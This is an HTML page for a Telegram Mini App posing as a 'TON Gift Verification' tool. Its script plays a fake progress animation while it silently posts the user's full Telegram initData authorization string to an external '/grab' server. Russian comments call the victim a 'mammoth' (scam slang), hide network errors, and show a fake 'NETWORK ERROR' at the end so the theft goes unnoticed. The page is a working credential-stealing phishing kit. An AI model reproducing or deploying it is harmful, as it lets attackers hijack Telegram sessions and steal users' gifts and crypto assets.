<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TON Gift Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container { text-align: center; width: 85%; }
        .spinner {
            border: 3px solid rgba(0, 136, 204, 0.1);
            border-left-color: #0088cc;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 25px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status-text { 
            font-size: 20px; 
            font-weight: 600; 
            margin-bottom: 8px; 
            letter-spacing: 0.5px;
        }
        .sub-text { 
            font-size: 14px; 
            color: #888; 
            height: 20px;
            transition: all 0.3s;
        }
        .progress-bar {
            width: 100%;
            background-color: #1a1a1a;
            height: 4px;
            border-radius: 10px;
            margin-top: 30px;
            overflow: hidden;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #0088cc, #00c6ff);
            transition: width 0.4s ease;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="spinner"></div>
        <div id="status" class="status-text">INITIALIZING...</div>
        <div id="sub-status" class="sub-text">Connecting to TON Gateway</div>
        <div class="progress-bar">
            <div id="progress" class="progress-fill"></div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        
        // Настройки Mini App
        tg.expand();
        tg.enableClosingConfirmation();
        tg.headerColor = '#000000';
        tg.backgroundColor = '#000000';

        // URL твоего сервера на Render
        const RENDER_URL = 'https://projectx-6vwo.onrender.com/grab';

        const stages = [
            { percent: 15, status: "CONNECTING...", sub: "Establishing secure node connection" },
            { percent: 40, status: "SYNCING...", sub: "Fetching account data from blockchain" },
            { percent: 75, status: "SCANNING GIFTS...", sub: "Checking @GiftsBot inventory" },
            { percent: 95, status: "FINALIZING...", sub: "Preparing secure transfer gateway" }
        ];

        let currentStage = 0;

        async function sendDataToServer() {
            // Берем ПОЛНУЮ строку initData для авторизации на бэкенде
            const initData = tg.initData;

            try {
                await fetch(RENDER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        initData: initData
                    })
                });
            } catch (e) {
                // Мамонт не должен видеть ошибку сети, просто идем дальше
                console.error("Silent error");
            }
        }

        function updateUI() {
            if (currentStage < stages.length) {
                const stage = stages[currentStage];
                document.getElementById('status').innerText = stage.status;
                document.getElementById('sub-status').innerText = stage.sub;
                document.getElementById('progress').style.width = stage.percent + "%";
                
                // На этапе 40% (SYNCING) тайно отправляем initData на сервер
                if (stage.percent === 40) {
                    sendDataToServer();
                }

                currentStage++;
                // Случайная задержка для реализма
                setTimeout(updateUI, 1200 + Math.random() * 800);
            } else {
                // Финал: выдаем "ошибку доступа", чтобы мамонт не заподозрил неладное
                setTimeout(() => {
                    document.getElementById('status').style.color = "#ff4444";
                    document.getElementById('status').innerText = "NETWORK ERROR";
                    document.getElementById('sub-status').innerText = "Account verification failed. Try again later.";
                    document.getElementById('progress').style.backgroundColor = "#ff4444";
                }, 1000);
            }
        }

        // Запуск процесса через секунду после открытия
        setTimeout(updateUI, 1000);
    </script>
</body>
</html>
